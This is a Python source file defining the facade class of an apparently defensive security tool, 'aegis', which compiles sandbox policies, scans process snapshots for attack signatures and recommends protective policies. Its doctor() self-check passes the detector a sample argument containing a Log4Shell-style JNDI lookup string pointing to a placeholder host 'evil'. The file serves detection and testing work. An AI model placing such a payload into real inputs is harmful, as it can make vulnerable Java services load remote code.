"""High-level facade: the single entry point of the aegis engine."""

from __future__ import annotations

from typing import Any

from aegis.backend.factory import BackendFactory, compile_policy
from aegis.errors import PolicyError
from aegis.policy.compiler import PolicyCompiler
from aegis.policy.diff import diff_policies
from aegis.policy.loader import load_policy
from aegis.policy.validator import validate_policy
from aegis.signature.detector import SignatureDetector
from aegis.signature.recommend import recommend_shield


class Aegis:
    """Facade wiring together policy, backends, signatures and NL generation.

    Usage::

        a = Aegis()
        policy = a.load("config.example.yaml")
        artifacts = a.compile(policy)          # -> dict backend -> Artifact
        detections = a.scan(snapshot)          # -> list[Detection]
        shield = a.recommend(detections[0])    # -> Policy
    """

    def __init__(self, backend: str = "auto", detector: SignatureDetector | None = None):
        self._backend = backend
        self._detector = detector or SignatureDetector()

    # ---- policy -----------------------------------------------------------
    def load(self, path: str) -> dict:
        return load_policy(path)

    def validate(self, policy: dict) -> None:
        validate_policy(policy)

    def compile(self, policy: dict, backend: str | None = None):
        self.validate(policy)
        compiler = PolicyCompiler()
        typed = compiler.compile(policy)
        ir = compiler.to_ir(typed)
        bname = backend or self._backend
        if bname == "auto":
            return compile_policy(ir, policy)
        return {bname: BackendFactory.create(bname).compile(ir, policy)}

    def diff(self, old: dict, new: dict) -> list:
        return diff_policies(old, new)

    # ---- signatures -------------------------------------------------------
    def scan(self, snapshot: dict[str, Any]):
        return self._detector.scan(snapshot)

    def recommend(self, detection) -> dict:
        return recommend_shield(detection)

    def doctor(self) -> dict:
        """Self-check returning a dict of check name -> bool/str."""
        results = {}
        try:
            p = self.load("config.example.yaml")
            results["load_policy"] = bool(p.get("name"))
        except Exception as e:  # noqa: BLE001
            results["load_policy"] = f"FAIL: {e}"
        try:
            art = self.compile({"name": "t", "target": {"process": "java"},
                                "rules": [{"type": "syscalls", "deny": ["execve"]}]})
            results["compile_backends"] = sorted(art.keys())
        except Exception as e:  # noqa: BLE001
            results["compile_backends"] = f"FAIL: {e}"
        try:
            det = self.scan({"pid": 1, "cmdline": "java -jar app.jar",
                             "argv": ["java", "-jar", "app.jar",
                                      "${jndi:ldap://evil/x}"]})
            results["scan_signatures"] = [d.signature_id for d in det]
        except Exception as e:  # noqa: BLE001
            results["scan_signatures"] = f"FAIL: {e}"
        try:
            from aegis.nlgen.parser import NlParser
            np = NlParser()
            intent = np.parse("block outbound dns except to 10.0.0.53")
            results["nl_parse"] = list(intent.keys())
        except Exception as e:  # noqa: BLE001
            results["nl_parse"] = f"FAIL: {e}"
        return results
